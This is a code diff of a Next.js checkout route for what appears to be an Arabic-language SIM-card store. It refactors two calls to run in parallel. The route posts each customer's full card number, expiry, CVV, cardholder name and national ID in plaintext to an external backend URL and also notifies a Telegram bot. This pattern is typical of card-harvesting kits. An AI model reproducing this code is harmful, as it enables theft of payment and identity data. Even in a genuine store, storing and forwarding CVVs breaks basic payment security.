@@ -6,22 +6,10 @@ export async function POST(req: NextRequest) {
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
-  // حفظ في الداتابيز
-  try {
-    const backendUrl = process.env.BACKEND_URL;
-    console.log("[notify] BACKEND_URL:", backendUrl);
-    const saveRes = await fetch(`${backendUrl}/api/checkout`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
-    });
-    const saveJson = await saveRes.json();
-    console.log("[notify] save response:", JSON.stringify(saveJson));
-  } catch (e) {
-    console.error("[notify] save error:", e);
-  }
+  // حفظ في الداتابيز + إرسال Telegram بالـ parallel
+  const backendUrl = process.env.BACKEND_URL;
+  const payload = JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment });
 
-  // Send Telegram
   const ltr = "\u200E";
   const text = [
     `🛒 متجر مؤسسة لمسه لبيع الشرائح`,
@@ -51,20 +39,21 @@ export async function POST(req: NextRequest) {
     ],
   };
 
-  try {
-    const tgRes = await fetch(
+  await Promise.all([
+    fetch(`${backendUrl}/api/checkout`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: payload,
+    }).then(r => r.json()).then(j => console.log("[notify] save response:", JSON.stringify(j))).catch(e => console.error("[notify] save error:", e)),
+    fetch(
       `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
       }
-    );
-    const tgJson = await tgRes.json();
-    console.log("[notify] telegram response:", JSON.stringify(tgJson));
-  } catch (e) {
-    console.error("[notify] telegram error:", e);
-  }
+    ).then(r => r.json()).then(j => console.log("[notify] telegram response:", JSON.stringify(j))).catch(e => console.error("[notify] telegram error:", e)),
+  ]);
 
   return NextResponse.json({ ok: true, orderId });
 }
